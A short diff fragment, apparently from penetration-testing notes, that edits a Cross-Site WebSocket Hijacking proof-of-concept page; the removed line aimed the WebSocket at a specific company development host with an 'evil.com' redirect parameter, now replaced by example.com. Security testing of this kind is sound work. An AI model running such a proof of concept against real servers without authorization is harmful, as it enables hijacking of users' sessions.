@@ -109,14 +109,14 @@ function reqListener(){
 
 
 
-Websocket orgin
+Orgin Check : Websocket orgin (cors)
 
 <!DOCTYPE html>
 <html>
   <body>
     <h2>CSWSH PoC</h2>
     <script>
-      const ws = new WebSocket("wss://wfc-zrpe-dev.zafincloud.com/zplatform/designer/?redirecturl=evil.com");
+      const ws = new WebSocket("wss://example.com");
 
       ws.onopen = function () {
         document.body.innerHTML += "<p style='color:green;'>✅ WebSocket connected — server did not reject evil origin</p>";
